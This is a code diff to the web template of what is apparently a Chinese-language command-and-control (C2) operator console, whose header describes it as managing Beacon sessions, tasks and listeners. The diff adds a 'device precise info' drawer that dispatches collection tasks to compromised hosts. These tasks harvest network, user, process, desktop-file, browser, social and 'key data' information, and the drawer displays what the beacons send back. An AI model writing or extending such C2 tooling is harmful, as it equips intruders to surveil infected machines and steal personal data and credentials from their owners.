@@ -197,9 +197,65 @@ label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
 /* Dock output area (transcript) reads better on pure white with darker ink. */
 [data-theme="light"] .mc-out .l-command { color: #1d4ed8; }
 [data-theme="light"] .mc-out .l-ok { color: #047857; }
+
+/* ===== device precise-info drawer (设备精确信息) ===== */
+#dp-drawer { position:fixed; top:0; right:0; bottom:0; width:460px; max-width:94vw; z-index:70;
+  background:var(--card); border-left:1px solid var(--border); box-shadow:-18px 0 48px rgba(2,6,23,.35);
+  display:none; flex-direction:column; }
+#dp-drawer.open { display:flex; }
+.dp-head { display:flex; align-items:center; gap:10px; padding:14px 16px; border-bottom:1px solid var(--border); }
+.dp-head b { font-size:13.5px; }
+.dp-head .sub { font-size:11px; color:var(--muted-foreground); font-family:"Fira Code",ui-monospace,monospace; }
+.dp-close { margin-left:auto; width:28px; height:28px; border-radius:8px; border:1px solid var(--border);
+  background:none; color:var(--muted-foreground); cursor:pointer; font-size:14px; line-height:1; }
+.dp-close:hover { color:var(--foreground); border-color:var(--ring); }
+.dp-body { flex:1; overflow-y:auto; padding:12px 16px 16px; }
+.dp-toolbar { display:flex; align-items:center; gap:10px; margin-bottom:10px; }
+.dp-progress { font-size:11.5px; color:var(--muted-foreground); }
+.dp-progress b { color:var(--foreground); }
+.dp-toolbar button { margin-left:auto; }
+.dp-tabs { display:flex; gap:2px; flex-wrap:wrap; border-bottom:1px solid var(--border); margin-bottom:10px; }
+.dp-tab { display:inline-flex; align-items:center; gap:6px; padding:7px 9px; font-size:11.5px;
+  color:var(--muted-foreground); cursor:pointer; border-bottom:2px solid transparent; user-select:none;
+  transition:color 160ms ease, border-color 160ms ease; }
+.dp-tab:hover { color:var(--foreground); }
+.dp-tab.active { color:var(--ring); border-bottom-color:var(--ring); font-weight:600; }
+.dp-dot { width:6px; height:6px; border-radius:50%; background:var(--border-strong); }
+.dp-dot.ok { background:var(--success); }
+.dp-dot.wait { background:var(--warning); }
+.dp-status { display:flex; align-items:center; gap:10px; margin-bottom:10px; font-size:11.5px; color:var(--muted-foreground); }
+.st-badge { font-size:10px; padding:1px 8px; border-radius:99px; border:1px solid var(--border); letter-spacing:.05em; }
+.st-dispatched { color:var(--warning); border-color:rgba(245,158,11,.4); }
+.st-completed { color:var(--success); border-color:rgba(52,211,153,.4); }
+.dp-fields { display:flex; flex-direction:column; gap:6px; margin-bottom:10px; }
+.dp-kv { display:flex; gap:10px; border:1px solid var(--border); border-radius:9px; background:var(--secondary); padding:7px 10px; font-size:11.5px; }
+.dp-kv .k { flex:0 0 96px; color:var(--muted-foreground); font-family:"Fira Code",ui-monospace,monospace; font-size:10.5px; word-break:break-all; }
+.dp-kv .v { flex:1; word-break:break-all; font-family:"Fira Code",ui-monospace,monospace; }
+.dp-raw { margin:0; font-family:"Fira Code",ui-monospace,monospace; font-size:11px; line-height:1.65;
+  white-space:pre-wrap; word-break:break-word; background:rgba(2,6,23,.55); border:1px solid var(--border);
+  border-radius:9px; padding:9px 11px; max-height:260px; overflow-y:auto; }
+[data-theme="light"] .dp-raw { background:rgba(15,23,42,.04); }
+.dp-empty { font-size:11.5px; color:var(--muted-foreground); }
 </style>
 
 <div id="host-menu" style="display:none;position:fixed;z-index:60;min-width:180px;padding:6px;border-radius:10px;"></div>
+
+<aside id="dp-drawer" aria-hidden="true">
+  <div class="dp-head">
+    <b>{{ _('设备精确信息') }}</b>
+    <span class="sub" id="dp-host-label"></span>
+    <button type="button" class="dp-close" id="dp-close" title="{{ _('关闭') }}">✕</button>
+  </div>
+  <div class="dp-body">
+    <div class="dp-toolbar">
+      <span class="dp-progress">{{ _('采集进度') }} <b id="dp-progress">0/10</b></span>
+      <button type="button" class="primary btn-sm" id="dp-collect">{{ _('下发采集任务') }}</button>
+    </div>
+    <div class="dp-tabs" id="dp-tabs"></div>
+    <div id="dp-pane"></div>
+  </div>
+</aside>
+
 {{ page_header('terminal', _('命令式 C2 管理'), _('Beacon 会话、任务队列、监听器与 Artifact 的实时控制台。')) }}
 <div class="mcs">
   <div class="mc-shell">
@@ -594,6 +650,7 @@ function loadOverview() {
     renderTasks(data.tasks || []);
     renderDock();
     if (state.tab === 'listeners') renderListenerCards(data.listeners || []);
+    if (dp.hostId !== null) loadDp();
   }).catch(function(e){ log('[err] overview 加载失败: ' + e.message, 'error'); });
 }
 
@@ -1195,6 +1252,7 @@ function showHostMenu(ev, hostId) {
   var m = document.getElementById('host-menu');
   var items = [
     {label:'交互（与双击同效）', fn:function(){ state.interactMode = true; renderDock(); }},
+    {label:'设备精确信息', fn:function(){ openDpDrawer(nid); }},
     {label:'设置心跳间隔', fn:function(){ var v = prompt('Beacon 心跳间隔（秒）：'); if (v) setIntervalValue(parseInt(v,10)); }},
     {label:'设置备注', fn:function(){ var v = prompt('主机备注：'); if (v !== null) setHostNote(v); }},
     {label:'删除主机', danger:true, fn:function(){ deleteHost(nid, ev); }},
@@ -1218,6 +1276,93 @@ document.addEventListener('click', function(ev){
   var m = document.getElementById('host-menu');
   if (m.style.display === 'block' && !m.contains(ev.target)) hideHostMenu();
 });
+
+/* ===== device precise-info drawer ===== */
+var DP_SECTIONS = [
+  {key:'basic', label:{{ _('基本信息') | tojson }}},
+  {key:'nic', label:{{ _('网卡信息') | tojson }}},
+  {key:'ip', label:{{ _('IP 信息') | tojson }}},
+  {key:'user', label:{{ _('用户信息') | tojson }}},
+  {key:'process', label:{{ _('进程信息') | tojson }}},
+  {key:'system', label:{{ _('系统信息') | tojson }}},
+  {key:'desktop', label:{{ _('桌面文件') | tojson }}},
+  {key:'browser', label:{{ _('浏览器信息') | tojson }}},
+  {key:'social', label:{{ _('社交信息') | tojson }}},
+  {key:'keydata', label:{{ _('关键数据') | tojson }}}
+];
+var dp = { hostId: null, active: 'basic', data: { profile: {}, status: {} } };
+
+function openDpDrawer(hostId) {
+  dp.hostId = Number(hostId);
+  var hosts = (state.overview || {}).hosts || [];
+  var h = null;
+  hosts.forEach(function(x){ if (x.id === dp.hostId) h = x; });
+  $('#dp-host-label').textContent = h ? ((h.hostname || h.hostUid || ('#' + h.id)) + ' · ' + ((h.externalIps||[])[0] || h.uid || '')) : ('#' + dp.hostId);
+  document.getElementById('dp-drawer').classList.add('open');
+  document.getElementById('dp-drawer').setAttribute('aria-hidden', 'false');
+  loadDp();
+}
+function closeDpDrawer() {
+  document.getElementById('dp-drawer').classList.remove('open');
+  document.getElementById('dp-drawer').setAttribute('aria-hidden', 'true');
+  dp.hostId = null;
+}
+function loadDp() {
+  if (dp.hostId === null) return;
+  mcFetch('/api/admin/managed/hosts/' + dp.hostId + '/profile').then(function(r){ return r.json(); }).then(function(data){
+    dp.data = data;
+    if (!(DP_SECTIONS.some(function(s){ return s.key === dp.active; }))) dp.active = 'basic';
+    renderDp();
+  }).catch(function(e){ log('[err] ' + {{ _('设备信息加载失败') | tojson }} + ': ' + e.message, 'error'); });
+}
+function renderDp() {
+  var profile = dp.data.profile || {}, status = dp.data.status || {};
+  var done = DP_SECTIONS.filter(function(s){ return !!profile[s.key]; }).length;
+  $('#dp-progress').textContent = done + '/' + DP_SECTIONS.length;
+  var tabs = '';
+  DP_SECTIONS.forEach(function(s){
+    var cls = 'dp-dot' + (profile[s.key] ? ' ok' : (status[s.key] ? ' wait' : ''));
+    tabs += '<div class="dp-tab' + (dp.active === s.key ? ' active' : '') + '" data-key="' + s.key + '">'
+      + '<span class="' + cls + '"></span>' + esc(s.label) + '</div>';
+  });
+  $('#dp-tabs').innerHTML = tabs;
+  document.querySelectorAll('#dp-tabs .dp-tab').forEach(function(el){
+    el.onclick = function(){ dp.active = el.getAttribute('data-key'); renderDp(); };
+  });
+  var s = DP_SECTIONS.filter(function(x){ return x.key === dp.active; })[0] || DP_SECTIONS[0];
+  var row = profile[s.key], st = status[s.key];
+  var html = '';
+  if (row) {
+    html += '<div class="dp-status"><span class="st-badge st-completed">' + {{ _('已回传') | tojson }} + '</span>'
+      + '<span>' + esc((row.collectedAt || '').replace('T', ' ').slice(0, 19)) + ' · ' + {{ _('任务') | tojson }} +' #' + (row.taskId || '-') + '</span></div>';
+    var fields = (row.data || {}).fields || {};
+    Object.keys(fields).forEach(function(k){
+      html += '<div class="dp-kv"><span class="k">' + esc(k) + '</span><span class="v">' + esc(String(fields[k])) + '</span></div>';
+    });
+    html += '<pre class="dp-raw">' + esc((row.data || {}).raw || '') + '</pre>';
+  } else if (st) {
+    html += '<div class="dp-status"><span class="st-badge st-dispatched">' + {{ _('已下发') | tojson }} + '</span>'
+      + '<span>' + {{ _('任务') | tojson }} + ' #' + (st.taskId || '-') + ' · ' + {{ _('等待 Beacon 回传') | tojson }} + '</span></div>'
+      + (st.commandText ? '<pre class="dp-raw">' + esc(st.commandText) + '</pre>' : '');
+  } else {
+    html += '<div class="dp-status"><span class="st-badge">' + {{ _('未采集') | tojson }} + '</span>'
+      + '<span>' + {{ _('尚未下发该类别的采集任务，点击右上角按钮开始') | tojson }} + '</span></div>';
+  }
+  $('#dp-pane').innerHTML = html;
+}
+document.getElementById('dp-collect').onclick = function(){
+  if (dp.hostId === null) return;
+  mcFetch('/api/admin/managed/hosts/' + dp.hostId + '/profile/collect', { method: 'POST' })
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      log('[sys] ' + {{ _('设备信息采集任务已下发') | tojson }} + ': ' + d.queued + {{ _(' 个') | tojson }} + (d.skipped ? ' / ' + {{ _('跳过在途') | tojson }} + ' ' + d.skipped : ''), 'ok');
+      loadOverview();
+      loadDp();
+    })
+    .catch(function(e){ log('[err] ' + e.message, 'error'); });
+};
+document.getElementById('dp-close').onclick = closeDpDrawer;
+document.addEventListener('keydown', function(ev){ if (ev.key === 'Escape') closeDpDrawer(); });
 
 /* boot: initial load + visibility-aware polling. acPoll (base.html) is defined
    in a script after the content block, so start it on DOMContentLoaded — it
